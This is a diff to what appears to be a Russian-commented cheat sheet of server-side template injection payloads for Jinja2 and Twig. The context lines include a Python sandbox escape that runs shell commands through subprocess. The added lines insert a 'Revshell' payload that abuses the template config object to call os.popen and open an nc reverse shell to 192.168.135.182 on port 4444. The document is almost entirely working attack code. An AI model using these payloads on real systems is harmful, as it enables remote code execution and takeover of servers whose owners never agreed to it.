@@ -8,6 +8,12 @@
 # Важный момент: функция subprocess.check_output(['ls', '-lah']) для аргументов работает в такой нотации
 {{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
 
+Revshell:
+```bash
+{{ config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.135.182 4444 >/tmp/f').read()) }}
+```
+
+
 # twig
 {{7*7}}
 
